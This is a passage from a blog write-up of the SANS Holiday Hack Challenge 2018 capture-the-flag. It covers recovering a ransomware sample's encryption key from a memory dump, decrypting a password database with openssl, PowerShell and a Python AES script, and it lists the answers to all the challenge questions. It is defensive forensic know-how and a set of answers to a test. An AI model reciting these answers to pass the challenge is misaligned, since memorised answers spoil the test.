<span class="gp">PS C:\&gt; </span><span class="nv">$b_k</span> <span class="p">=</span> <span class="p">@(</span><span class="n">1</span><span class="p">..</span><span class="n">16</span><span class="p">)</span>
<span class="gp">PS C:\&gt; </span><span class="n">p_k_e</span> <span class="nv">$b_k</span> <span class="nv">$p_k</span>
<span class="go">b9554cb7ea6ff46c689d90a8d42fc9b9692552d42b6ca34c8aa4593602e7d0cbef88d5dda935960c4ab4e92d789e290c58bf1a280ca9bbf502a8c43ad0eba242e2c8000d5e81fb73aa381dff97cf58c51bb1a49d3a54c15a4de84cf3029cc9dba7364ccc78e95058480f25719cb6aa7763469175dadd031113f6f64ba461adb5303a5c65cb6260bf1ca24eed4e251a99f4219cee6f35aa166e29c3215381bfecd0f9b3eded6acfeeaf8695f55b8e3741c8ca365f8a81560fb92e1bddb11b1bb19399b0a377dd5226e0930ea812c8c151382a7508aab93b4a9f19535fa2808b23520f249bb63d747f3e49a4b279a3cafcadba4daa2175b35d8841def66a2abfd4</span>
</pre></div>
<p>Alright, the encrypted key we're looking for seems to be a 512-byte long hex
representation. Let's use <code>strings</code> and <code>grep</code> to look for
something like this in the memory dump:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> strings -e b powershell.exe_181109_104716.dmp<span class="p">|</span> grep -E <span class="s1">&#39;^[0-9a-f]{512}$&#39;</span>
<span class="go">3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971</span>
</pre></div>
<p>We got a unique match! This may be our luck. Let's hex-decode this string, and
try to decrypt it. To decrypt it, I'll use <code>openssl</code> to generate a full
certificate, with combined public and private keys in a single file. The
resulting <code>.pfx</code> file won't have any passphrase:</p>
<p><em>NB: Before that, make sure that you add</em> <code>-----BEGIN CERTIFICATE-----</code>
<em>and</em> <code>-----END CERTIFICATE-----</code> <em>in the public key file.</em></p>
<div class="highlight"><pre><span></span><span class="gp">$</span> strings -e b powershell.exe_181109_104716.dmp<span class="p">|</span> grep -E <span class="s1">&#39;^[0-9a-f]{512}$&#39;</span> <span class="p">|</span> xxd -p -r &gt; encrypted_aes_key.raw
<span class="gp">$</span> openssl pkcs12 -export -in ./public.cer -inkey ./private.key -out wannacookie_cert.pfx
<span class="go">Enter Export Password:</span>
<span class="go">Verifying - Enter Export Password:</span>
</pre></div>
<p>Now let's decrypt this key:</p>
<div class="highlight"><pre><span></span><span class="gp">PS C:\&gt; </span><span class="nv">$wannacookie_cert</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Cryptography</span><span class="p">.</span><span class="n">X509Certificates</span><span class="p">.</span><span class="n">X509Certificate2</span><span class="p">(</span><span class="s2">&quot;C:\path\to\wannacookie_cert.pfx&quot;</span><span class="p">)</span>
<span class="gp">PS C:\&gt; </span><span class="nv">$key_bytes</span> <span class="p">=</span> <span class="no">[System.IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s2">&quot;C:\path\to\encrypted_aes_key.raw&quot;</span><span class="p">)</span>
<span class="gp">PS C:\&gt; </span><span class="n">B2H</span> <span class="p">$(</span><span class="nv">$wannacookie_cert</span><span class="p">.</span><span class="n">PrivateKey</span><span class="p">.</span><span class="n">Decrypt</span><span class="p">(</span><span class="nv">$key_bytes</span><span class="p">,</span> <span class="nv">$true</span><span class="p">))</span>
<span class="hll"><span class="go">fbcfc121915d99cc20a3d3d5d84f8308</span>
</span></pre></div>
<p>We have our decrypted key (well, <em>a</em> decrypted key). Let's see if it works.
Since I loath PowerShell's syntax, I'm using a little Python script to decrypt
Alabaster's password database:</p>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">struct</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
        <span class="k">print</span> <span class="s1">&#39;Usage: {} &lt;file_to_decrypt&gt; &lt;key&gt;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">encrypted_file</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">decrypted_file</span> <span class="o">=</span> <span class="n">encrypted_file</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;.wannacookie&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">encrypted_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="c1"># We read 4 bytes to get the IV&#39;s size</span>
        <span class="n">iv_size</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&lt;i&#39;</span><span class="p">,</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>

        <span class="c1"># We read the IV</span>
        <span class="n">iv</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">iv_size</span><span class="p">)</span>

        <span class="c1"># We read the rest of the file</span>
        <span class="n">encrypted_content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

    <span class="n">key</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>

    <span class="n">aes</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
    <span class="n">decrypted_content</span> <span class="o">=</span> <span class="n">aes</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">encrypted_content</span><span class="p">)</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">decrypted_file</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted_content</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="gp">$</span> ./decrypt_wannacookie.py ./alabaster_passwords.elfdb.wannacookie fbcfc121915d99cc20a3d3d5d84f8308
<span class="gp">$</span> file alabaster_passwords.elfdb
<span class="go">alabaster_passwords.elfdb: SQLite 3.x database, last written using SQLite version 3015002</span>
</pre></div>
<p><strong>Finally!</strong> We have our decrypted file:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> sqlite3 ./alabaster_passwords.elfdb
<span class="go">SQLite version 3.22.0 2018-01-22 18:45:57</span>
<span class="go">Enter &quot;.help&quot; for usage hints.</span>
<span class="go">sqlite&gt; .schema</span>
<span class="go">CREATE TABLE IF NOT EXISTS &quot;passwords&quot; (</span>
<span class="go">    `name`    TEXT NOT NULL,</span>
<span class="go">    `password`    TEXT NOT NULL,</span>
<span class="go">    `usedfor`    TEXT NOT NULL</span>
<span class="go">);</span>
<span class="go">sqlite&gt; select * from passwords where usedfor=&quot;vault&quot;;</span>
<span class="hll"><span class="go">alabaster.snowball|ED#ED#EED#EF#G#F#G#ABA#BA#B|vault</span>
</span></pre></div>
<p>We finally find the final password: <code>ED#ED#EED#EF#G#F#G#ABA#BA#B</code>.</p>
</div>
</div>
</div>
<div class="section" id="who-is-behind-it-all">
<h2><a class="toc-backref" href="#id46">Who Is Behind It All?</a></h2>
<p>Using Alabaster's password, we can now try to enter Santa's vault. We just have
to play the tune on the piano lock and...</p>
<img alt="pianolock_fail.png" class="align-center" src="/images/sans-christmas-challenge-2018/pianolock_fail.png" />
<p>Damn! This isn't the right key! If you remember Holy Evergreen's document on
music transposition, Alabster likes song in the key of D major. Now, we just
have to find what's the key of the original song.</p>
<p>We can use the following rules of thumb:</p>
<ul class="simple">
<li>What's the first note? E.</li>
<li>What's the most common note? E.</li>
<li>What's the last note? B.</li>
</ul>
<p>The two first rules hint that this is in the key of E. Indeed, every note in
the password fit in the <a class="reference external" href="https://en.wikipedia.org/wiki/E_major">E major scale</a>
(well, except for the borrowed A♯).</p>
<p><em>Note: this is by no means a fool-proof method to identify the key of a song,
but it can be handy.</em></p>
<p>So, the song is in E major, and we want it in D major. D is a whole step below
E, so we must take every note in the song, and move them down one whole step.
This gives us <code>DC#DC#DDC#DEF#EF#GAG#AG#A</code>. We can now play this on the
piano lock:</p>
<img alt="pianolock_success.png" class="align-center" src="/images/sans-christmas-challenge-2018/pianolock_success.png" />
<p>This gives us the message <code>You have unlocked Santa's vault!</code>.</p>
<p>Success! We now have access to Santa's vault. Now, to find who is behind it
all. We go inside the vault and we find... Hans? And Santa?!</p>
<img alt="alabaster.png" class="align-center" src="/images/sans-christmas-challenge-2018/alabaster.png" />
<p><em>Alabaster says</em></p>
<blockquote>
<p>I'm seriously impressed by your security skills!</p>
<p>How could I forget that I used Rachmaninoff as my musical password?</p>
<p>Of course I transposed it it before I entered it into my database for extra
security.</p>
<p><em>Alabaster steps aside, revealing two familiar, smiling faces.</em></p>
</blockquote>
<img alt="hans_smile.png" class="align-center" src="/images/sans-christmas-challenge-2018/hans_smile.png" />
<p><em>Hans says</em></p>
<blockquote>
<p>It’s a pleasure to see you again.</p>
<p>Congratulations.</p>
</blockquote>
<img alt="santa.png" class="align-center" src="/images/sans-christmas-challenge-2018/santa.png" />
<p><em>Santa says</em></p>
<blockquote>
<p>You DID IT! You completed the hardest challenge. You see, Hans and the
soldiers work for ME. I had to test you. And you passed the test!</p>
<p>You WON! Won what, you ask? Well, the jackpot, my dear! The grand and
glorious jackpot!</p>
<p>You see, I finally found you!</p>
<p>I came up with the idea of KringleCon to find someone like you who could
help me defend the North Pole against even the craftiest attackers.</p>
<p>That’s why we had so many different challenges this year.</p>
<p>We needed to find someone with skills all across the spectrum.</p>
<p>I asked my friend Hans to play the role of the bad guy to see if you could
solve all those challenges and thwart the plot we devised.</p>
<p>And you did!</p>
<p>Oh, and those brutish toy soldiers? They are really just some of my elves
in disguise.</p>
<p>See what happens when they take off those hats?</p>
</blockquote>
<img alt="toy_soldier_green_no_hat.png" class="align-center" src="/images/sans-christmas-challenge-2018/toy_soldier_green_no_hat.png" />
<img alt="santa.png" class="align-center" src="/images/sans-christmas-challenge-2018/santa.png" />
<p><em>Santa continues</em></p>
<blockquote>
<p>Based on your victory… next year, I’m going to ask for your help in
defending my whole operation from evil bad guys.</p>
<p>And welcome to my vault room. Where's my treasure? Well, my treasure is
Christmas joy and good will.</p>
<p>You did such a GREAT job! And remember what happened to the people who
suddenly got everything they ever wanted?</p>
<p>They lived happily ever after.</p>
</blockquote>
<p>Thank you, Santa!</p>
<img alt="santas_vault_selfie.png" class="align-center" src="/images/sans-christmas-challenge-2018/santas_vault_selfie.png" />
</div>
<div class="section" id="answers-to-the-questions">
<h2><a class="toc-backref" href="#id47">Answers to the questions</a></h2>
<p>Let's answer the questions:</p>
<ol class="arabic simple">
<li>What phrase is revealed when you answer all of the <a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/osint_challenge_windows.html">KringleCon Holiday Hack
History questions</a>?</li>
</ol>
<p>The phrase revealed is <code>Happy Trails</code>.</p>
<ol class="arabic simple" start="2">
<li>Who submitted (First Last) the rejected talk titled <strong>Data Loss for Rainbow
Teams: A Path in the Darkness</strong>?</li>
</ol>
<p>The talk was submitted by John McClane.</p>
<ol class="arabic simple" start="3">
<li>The KringleCon Speaker Unpreparedness room is a place for frantic speakers
to furiously complete their presentations. The room is protected by a door
passcode. Upon entering the correct passcode, what message is presented to
the speaker?</li>
</ol>
<p>The message is <code>Welcome unprepared speaker!</code>.</p>
<ol class="arabic simple" start="4">
<li>Retrieve the encrypted ZIP file from the North Pole Git repository. What is
the password to open this file?</li>
</ol>
<p>The password is <code>Yippee-ki-yay</code>, motherf*cker.</p>
<ol class="arabic simple" start="5">
<li>Using the data set contained in this <a class="reference external" href="https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova">SANS Slingshot Linux image</a>,
find a reliable path from a Kerberoastable user to the Domain Admins group.
What’s the user’s logon name (in <a class="reference external" href="mailto:username&#64;domain.tld">username&#64;domain.tld</a> format)?</li>
</ol>
<p>The user is <code>LDUBEJ00320&#64;AD.KRINGLECASTLE.COM</code>.</p>
<ol class="arabic simple" start="6">
<li>Bypass the authentication mechanism associated with the room near Pepper
Minstix. <a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg">A sample employee badge is available</a>.
What is the access control number revealed by the <a class="reference external" href="https://scanomatic.kringlecastle.com/index.html">door authentication
panel</a>?</li>
</ol>
<p>The access control number is <code>19880715</code>.</p>
<ol class="arabic simple" start="7">
<li>Santa uses an Elf Resources website to look for talented information
security professionals. <a class="reference external" href="https://careers.kringlecastle.com/">Gain access to the website</a> and fetch the document
<code>C:\candidate_evaluation.docx</code>. Which terrorist organization is
secretly supported by the job applicant whose name begins with &quot;K&quot;?</li>
</ol>
<p>The terrorist organization is <code>Fancy Beaver</code>.</p>
<ol class="arabic simple" start="8">
<li>Santa has introduced a <a class="reference external" href="https://packalyzer.kringlecastle.com/">web-based packet capture and analysis tool</a> to support the elves and their
information security work. Using the system, access and decrypt HTTP/2
network activity. What is the name of the song described in the document
sent from Holly Evergreen to Alabaster Snowball?</li>
</ol>
<p>The song is <code>Mary Had a Little Lamb</code>.</p>
<ol class="arabic simple" start="9">
<li>Alabaster Snowball is in dire need of your help. Santa's file server has
been hit with malware. Help Alabaster Snowball deal with the malware on
Santa's server by completing several tasks. To start, assist Alabaster by
accessing (clicking) the snort terminal below. Then create a rule that will
catch all new infections. What is the success message displayed by the Snort
terminal?</li>
</ol>
<p>The success message is <code>[+] Congratulation! Snort is alerting on all
ransomware and only the ransomware!</code>.</p>
<ol class="arabic simple" start="10">
<li>After completing the prior question, Alabaster gives you a document he
suspects downloads the malware. What is the domain name the malware in the
document downloads from?</li>
</ol>
<p>The domain name is <code>erohetfanu.com</code>.</p>
<ol class="arabic simple" start="11">
<li>Analyze the full malware source code to find a kill-switch and activate it
at the North Pole's domain registrar <a class="reference external" href="https://hohohodaddy.kringlecastle.com/index.html">HoHoHo Daddy</a>. What is the full
sentence text that appears on the domain registration success message
(bottom sentence)?</li>
</ol>
<p>The sentence is <code>Successfully registered yippeekiyaa.aaay!</code>.</p>
<ol class="arabic simple" start="12">
<li>After activating the kill-switch domain in the last question, Alabaster
gives you a <a class="reference external" href="https://www.holidayhackchallenge.com/2018/challenges/forensic_artifacts.zip">zip file</a>
with a memory dump and encrypted password database. Use these files to
decrypt Alabaster's password database. What is the password entered in the
database for the Vault entry?</li>
</ol>
<p>The password in the database is <code>ED#ED#EED#EF#G#F#G#ABA#BA#B</code>.</p>
<ol class="arabic simple" start="13">
<li>Use what you have learned from previous challenges to open the <a class="reference external" href="https://pianolockn.kringlecastle.com/">door to
Santa's vault</a>. What message do
you get when you unlock the door?</li>
</ol>
<p>The message is <code>You have unlocked Santa's vault!</code>.</p>
<ol class="arabic simple" start="14">
<li>Who was the mastermind behind the whole KringleCon plan?</li>
</ol>
<p>The mastermind was Santa all along!</p>
</div>
<div class="section" id="conclusion">
<h2><a class="toc-backref" href="#id48">Conclusion</a></h2>
<p>Whew! Well, this sure was challenging. For some of these questions, I think I
was too focused on one possible answer, and when I saw it wasn't the correct
one, I felt out of ideas. For example, I shouldn't have missed the hex encoding
of the file names in the ransomware source code, but I was distracted by the
unsafe randomness!</p>
<p>Which brings the question, is <code>Get-Random</code> actually cryptographically
safe is used without a seed? This seems to contradicts what I've found during
my research, but I don't have the answer 🤷‍♂️.</p>
<p>Our next question is, what does <code>erohetfanu</code> (the domain used for the
ransomware DNS server) mean? I asked one of my anagram-enthusiast friend what
it could mean, and he gave me the following answers:</p>
<ul class="simple">
<li>Four ethane</li>
<li>A fun hetero <em>(I like this one)</em></li>
<li>Ah fourteen</li>
<li>Unearth foe</li>
<li>Fear the UNO <em>(Hmmm, what?)</em></li>
<li>One fur heat</li>
<li>Eat, fun hero <em>(Also like this one)</em></li>
<li>A foe hunter <em>(Probably this one, though)</em></li>
</ul>
<p>And finally <a class="reference external" href="https://nerdist.com/die-hard-christmas-movie/">does this really qualify as a **Christmas** challenge</a>? 😉</p>
<p>Once again, congratulations to the SANS team for a well executed challenge. I
enjoyed the fact that it allowed people to use real-world professional tools
and techniques (like <code>BloodHound</code>, and Kerberoast). I also really liked
the malware analysis portion, even if I was a litle bit frustrated with myself!
It's not something that we usually do in our day-to-day work and I enjoyed the
exercise.</p>
<p>See you next year!</p>
</div>
<div class="section" id="appendix-chocolate-chip-cookie-recipe">
<h2><a class="toc-backref" href="#id49">Appendix: Chocolate Chip Cookie Recipe</a></h2>
<img alt="chocolate_chip_cookie_recipe.jpg" class="align-center" src="/images/sans-christmas-challenge-2018/chocolate_chip_cookie_recipe.jpg" />
<p><strong>PREHEAT</strong>&nbsp;oven to 375° F.</p>
<p><strong>COMBINE</strong>&nbsp;flour, baking soda and salt in small bowl. Beat butter, granulated
sugar, brown sugar and vanilla extract in large mixer bowl until creamy. Add
eggs, one at a time, beating well after each addition. Gradually beat in flour
mixture. Stir in morsels and nuts. Drop by rounded tablespoon onto ungreased
baking sheets.</p>
<p><strong>BAKE</strong>&nbsp;for 9 to 11 minutes or until golden brown. Cool on baking sheets for
2 minutes; remove to wire racks to cool completely.</p>
<p><strong>PAN COOKIE VARIATION:</strong>&nbsp;Preheat oven to 350° F. Grease 15 x 10-inch
jelly-roll pan. Prepare dough as above. Spread into prepared pan. Bake for 20
to 25 minutes or until golden brown. Cool in pan on wire rack. Makes 4 dozen
bars.</p>
<p><strong>SLICE AND BAKE COOKIE VARIATION: PREPARE</strong>&nbsp;dough as above. Divide in half;
wrap in waxed paper. Refrigerate for 1 hour or until firm. Shape each half into
15-inch log; wrap in wax paper.  Refrigerate for 30 minutes.* Preheat oven to
375° F. Cut into 1/2-inch-thick slices; place on ungreased baking sheets. Bake
for 8 to 10 minutes or until golden brown. Cool on baking sheets for 2 minutes;
remove to wire racks to cool completely. Makes about 5 dozen cookies.</p>
<p><em>* May be stored in refrigerator for up to 1 week or in freezer for up to 8
weeks.</em></p>
<p><strong>FOR HIGH ALTITUDE BAKING (5,200 feet):</strong>&nbsp;Increase flour to 2 1/2 cups. Add 2
teaspoons water with flour and reduce both granulated sugar and brown sugar to
2/3 cup&nbsp;each. Bake drop cookies for 8 to 10 minutes and pan cookie for 17 to 19
minutes.</p>
</div>

  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>
</article>

    <footer>
<p>
  &copy; Yannick Méheut 2020 - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
</p>
<p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by-sa/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
         src="https://i.creativecommons.org/l/by-sa/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BlogPosting",
  "name": "SANS Christmas Challenge 2018",
  "headline": "SANS Christmas Challenge 2018",
  "datePublished": "2019-01-14 00:00:00+01:00",
  "dateModified": "",
  "author": {
    "@type": "Person",
    "name": "useless",
    "url": "https://allyourbase.utouch.fr/author/useless.html"
  },
  "image": "/images/useless_profile_pic.jpg",
  "url": "https://allyourbase.utouch.fr/posts/2019/01/14/sans-christmas-challenge-2018/",
  "description": "🎵 I'm dreaming of a pwned Christmaaaaas 🎵 As usual, here's my write-up for the 2018 SANS Christmas Challenge. Table of contents Introduction Orientation Challenge Bushy Evergreen's Cranberry Pi Challenge KringleCon Holiday Hack History questions Directory Browsing Minty Candycane's Cranberry Pi Challenge Analyzing the KringleCon CFP website de Bruijn Sequences Tangle Coalbox's …"
}
</script></body>
</html>